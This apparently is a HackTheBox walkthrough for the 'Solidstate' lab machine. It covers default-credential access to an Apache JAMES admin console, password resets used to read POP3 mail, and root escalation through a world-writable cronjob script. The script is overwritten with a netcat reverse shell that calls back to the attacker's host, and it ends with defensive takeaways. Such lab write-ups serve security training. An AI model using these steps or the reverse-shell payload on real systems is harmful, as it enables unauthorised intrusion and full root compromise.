# Solidstate — HackTheBox Walkthrough

**Platform:** HackTheBox
**Difficulty:** Medium
**OS:** Linux

---

## TL;DR

JAMES Remote Administration Tool (Port 4555) allows unauthenticated access using default credentials (`root:root`) → Changing the password for the `mindy` user allows us to log into POP3 and read her emails → Extracted SSH credentials (`mindy : P@55W0rd1!2@`) provide the initial foothold → Running `pspy32` reveals a root cronjob executing `/opt/tmp.py` every 3 minutes → Overwriting the world-writable script with a Python reverse shell drops a root shell.

---

## Enumeration

Full nmap scan:

```bash
nmap -sC -sV -p- -n -Pn --min-rate=9018 10.10.10.51
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.4p1 Debian |
| 25 | SMTP | JAMES smtpd 2.3.2 |
| 80 | HTTP | Apache httpd 2.4.25 (Debian) |
| 110 | POP3 | JAMES pop3d 2.3.2 |
| 119 | NNTP | JAMES nntpd |
| 4555 | RSIP | JAMES Remote Administration Tool 2.3.2 |

The Nmap scan reveals the target is heavily utilizing the Apache JAMES (Java Apache Mail Enterprise Server) suite. Port 4555 stands out as the administration console for the mail server. 

Browsing the website on port 80 reveals a contact email address: `webadmin@solid-state-security.com`.

---

## Exploitation — JAMES Admin Console Abuse

We attempt to connect to the JAMES Remote Administration Tool on port 4555 using `nc`:

```bash
nc 10.10.10.51 4555
```

The console prompts for a login ID and password. Trying the default credentials for Apache JAMES (`root : root`) successfully authenticates us as an administrator.

Inside the administration console, we type `help` to list commands and `listusers` to enumerate the existing mail accounts:
- `james`
- `thomas`
- `john`
- `mindy`
- `mailadmin`

Since we are inside the admin console, we have the authority to change the passwords for any of these users without knowing their current passwords. We use the `setpassword` command:

```text
setpassword john john
setpassword mindy mindy
```

With the passwords reset, we can now log into the POP3 service on port 110 to read their emails. We use `telnet` or `nc`:

```bash
nc 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
```

We log in as `john`:
```text
USER john
PASS john
LIST
RETR 1
```

John's emails don't contain anything immediately useful to gain a shell. Next, we log in as `mindy`:
```text
USER mindy
PASS mindy
LIST
RETR 2
```

In Mindy's second email, an administrator provides her with temporary SSH credentials to access the machine directly:
`mindy : P@55W0rd1!2@`

We use these credentials to authenticate via SSH:

```bash
ssh mindy@10.10.10.51
```

We have user access.

---

## Privilege Escalation — Writable Cronjob

Once on the system, we need to enumerate local privilege escalation vectors. Because `cron` jobs are notoriously difficult to enumerate manually without root permissions (unless they are world-readable in `/etc/crontab`), we transfer `pspy32` (a process monitoring tool) to the target machine via `wget` or `scp`.

We execute `pspy32` to watch for recurring background processes:

```bash
./pspy32 -pf -i 1000
```

After a few minutes, we observe the `root` user executing a Python script every 3 minutes:
`/opt/tmp.py`

We check the permissions of the script:

```bash
ls -la /opt/tmp.py
```

The script is world-writable (`-rwxrwxrwx`), meaning our low-privileged user `mindy` can modify its contents.

Instead of writing complex code, we completely replace the contents of `/opt/tmp.py` with a simple Python script to execute a Netcat reverse shell via `busbox` (or standard `bash`):

```bash
cat << 'EOF' > /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('busybox nc 10.10.14.32 2222 -e /bin/sh')
except:
     sys.exit()
EOF
```

We start a Netcat listener on port 2222 on our attacking machine. 
Within three minutes, the root cronjob triggers, executes our modified Python script, and shovels a reverse shell to our listener.

We are `root`. 🎉

---

## Key Takeaways

- **Default Credentials:** Leaving administrative consoles accessible via default credentials (`root:root`) is a catastrophic error that instantly granted full control over the mail infrastructure.
- **World-Writable Executables:** Any script executed by a high-privileged account (like via a root cronjob) MUST strictly lock down write permissions. If any other user can modify the script, they effectively have the ability to execute code as root.

---

*Thanks for reading! Follow for more HackTheBox walkthrough content.*